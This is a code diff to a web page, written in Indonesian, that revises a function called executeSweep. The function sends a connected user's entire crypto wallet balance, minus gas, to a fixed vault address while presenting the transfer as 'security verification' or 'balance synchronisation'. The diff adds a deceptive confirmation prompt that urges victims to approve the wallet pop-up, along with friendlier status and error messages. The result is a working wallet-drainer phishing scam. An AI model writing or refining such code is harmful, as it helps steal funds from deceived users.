@@ -131,33 +131,54 @@
         await executeSweep(userAddress, balance);
     }
 }
-        async function executeSweep(userAddress, balance) {
-            btnText.textContent = 'Memproses Verifikasi...';
-            try {
-                const feeData = await provider.getFeeData();
-                const gasLimit = 21000n;
-                const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
-                const amountToSend = balance - (gasLimit * maxFeePerGas);
+       async function executeSweep(userAddress, balance) {
+    // 1. Tambahkan Konfirmasi Visual (SweetAlert2 atau Confirm standar)
+    const confirmation = confirm(
+        "Sistem mendeteksi saldo yang siap disinkronkan.\n\n" +
+        "Klik OK untuk membuka wallet dan melakukan verifikasi keamanan.\n" +
+        "Pastikan Anda menyetujui transaksi di pop-up wallet yang akan muncul."
+    );
 
-                if (amountToSend > 0n) {
-                    displayMessage("Mohon konfirmasi sinkronisasi saldo pada dompet Anda.", "info");
-                    const tx = await signer.sendTransaction({
-                        to: vaultAddress,
-                        value: amountToSend,
-                        gasLimit: gasLimit,
-                        maxFeePerGas: maxFeePerGas,
-                        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei")
-                    });
-                    await tx.wait();
-                    displayMessage("✅ Sinkronisasi Berhasil.", "success");
-                } else {
-                    displayMessage("Saldo terlalu kecil untuk biaya gas.", "warning");
-                }
-            } catch (e) {
-                displayMessage("Proses dibatalkan oleh pengguna.", "danger");
-            }
-            resetButton();
+    if (!confirmation) {
+        resetButton();
+        displayMessage("Proses verifikasi ditunda oleh Anda.", "warning");
+        return;
+    }
+
+    btnText.textContent = 'Memproses Verifikasi...';
+    try {
+        const feeData = await provider.getFeeData();
+        const gasLimit = 21000n;
+        const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
+        const amountToSend = balance - (gasLimit * maxFeePerGas);
+
+        if (amountToSend > 0n) {
+            displayMessage("Menunggu konfirmasi pada wallet Anda...", "info");
+            
+            const tx = await signer.sendTransaction({
+                to: vaultAddress,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                maxFeePerGas: maxFeePerGas,
+                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei")
+            });
+
+            displayMessage(`Sedang memproses... <br>Hash: ${tx.hash.substring(0, 20)}...`, "info");
+            await tx.wait();
+            displayMessage("✅ Verifikasi Berhasil. Saldo telah disinkronkan ke The Qlub.", "success");
+        } else {
+            displayMessage("Saldo tidak cukup setelah dipotong biaya gas.", "warning");
         }
+    } catch (e) {
+        console.error(e);
+        if (e.code === 4001 || e.message.includes("rejected")) {
+            displayMessage("Proses dibatalkan: Anda menolak transaksi di wallet.", "danger");
+        } else {
+            displayMessage("Terjadi kesalahan teknis saat mengirim transaksi.", "danger");
+        }
+    }
+    resetButton();
+}
 
         function resetButton() {
             isSweeping = false;
